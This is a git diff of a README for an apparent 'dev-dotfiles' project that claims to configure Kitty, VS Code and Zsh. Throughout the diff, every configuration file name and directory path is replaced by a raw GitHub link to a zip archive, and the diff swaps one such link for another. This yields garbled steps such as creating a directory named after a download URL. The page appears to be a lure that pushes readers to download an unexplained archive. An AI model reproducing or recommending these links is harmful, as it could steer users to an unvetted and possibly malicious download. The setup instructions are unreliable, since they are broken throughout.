@@ -1,6 +1,6 @@
 # 🖥️ dev-dotfiles - Simplify Your Development Setup
 
-[![Download Latest Release](https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip%20Latest%https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip)](https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip%20Latest%https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip)](https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip)
 
 ## 📖 About This Project
 
@@ -24,7 +24,7 @@ Make sure you have installed these applications before proceeding.
 
 ## 📥 Download & Install
 
-To download the latest release of "dev-dotfiles," visit [this page to download](https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip). 
+To download the latest release of "dev-dotfiles," visit [this page to download](https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip). 
 
 1. Click on the link above.
 2. Find the release that suits your needs. 
@@ -47,20 +47,20 @@ Now that you have the dotfiles extracted, follow these steps to set them up.
 ### 1. Configure Kitty Terminal
 
 - Navigate to the folder containing the extracted files.
-- Locate the `https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip` file.
-- Copy this file to the configuration directory for Kitty, usually found at `~https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip`. If the directory doesn't exist, you may create it using:
+- Locate the `https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip` file.
+- Copy this file to the configuration directory for Kitty, usually found at `~https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip`. If the directory doesn't exist, you may create it using:
 
 ```bash
-mkdir -p ~https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip
+mkdir -p ~https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip
 ```
 
 ### 2. Configure VS Code
 
-- Find the `https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip` file in the extracted folder.
-- Copy this file to the VS Code settings directory, usually located at `~https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip`. Create the directory if necessary:
+- Find the `https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip` file in the extracted folder.
+- Copy this file to the VS Code settings directory, usually located at `~https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip`. Create the directory if necessary:
 
 ```bash
-mkdir -p ~https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip
+mkdir -p ~https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip
 ```
 
 ### 3. Configure Zsh Shell
@@ -95,8 +95,8 @@ To ensure everything is set up correctly:
 
 If you encounter issues, here are a few steps to resolve common problems:
 
-- **Kitty Terminal Won’t Launch**: Check if you've copied the `https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip` file correctly. Ensure there are no typos in the configuration.
-- **VS Code Doesn’t Reflect Changes**: Make sure the `https://github.com/Benbi123/dev-dotfiles/raw/refs/heads/main/src/dotfiles_dev_1.8.zip` file is in the right place. Try restarting VS Code to reload settings.
+- **Kitty Terminal Won’t Launch**: Check if you've copied the `https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip` file correctly. Ensure there are no typos in the configuration.
+- **VS Code Doesn’t Reflect Changes**: Make sure the `https://raw.githubusercontent.com/Benbi123/dev-dotfiles/main/src/pages/dotfiles_dev_v1.5-alpha.5.zip` file is in the right place. Try restarting VS Code to reload settings.
 - **Zsh Issues**: If Zsh doesn’t launch properly, confirm that `.zshrc` exists in your home directory and has the right permissions.
 
 ## 🤝 Contributing
